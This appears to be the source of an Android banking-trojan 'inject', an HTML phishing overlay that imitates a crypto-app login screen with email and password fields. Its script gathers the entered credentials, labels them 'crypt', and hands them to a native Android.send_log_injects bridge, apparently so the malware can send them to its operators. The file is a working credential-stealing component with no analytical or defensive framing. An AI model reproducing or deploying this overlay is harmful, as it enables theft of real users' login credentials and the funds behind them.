    <style>
        body {
            background-color: #000000;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 15px;
        }

        .input {
            width: 100%;
            padding: 8px;
            padding-left: 0;
            margin-bottom: 15px;
            background-color: transparent;
            border: 0;
            border-bottom: 1px solid #323235;
            color: #fff;
        }

        footer {
            padding: 10px;
            background-color: #141414;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #65ce86;
            color: #000;
            border: 0;
            border-radius: 8px;
            font-weight: 600;
            font-size: 18px;
        }

        .button:disabled {
            opacity: 0.4;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>

        <section>
            <input type="text" class="input" name="login" id="login" placeholder="Email address" autocomplete="off">
            <input type="password" class="input" id="password" name="password" placeholder="Password" autocomplete="off">

            <p style="text-align: center;color: #65ce84;"> 
                Forgot your password?
            </p>
        </section>
        <footer>
            <input type="submit" class="button" id="sendData" disabled value="Log in">
        </footer>
    </form>
    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');
        
        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check()
        }

        password.onkeyup = () => {
            check()
        }

        sendData.onclick = () => {
            var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
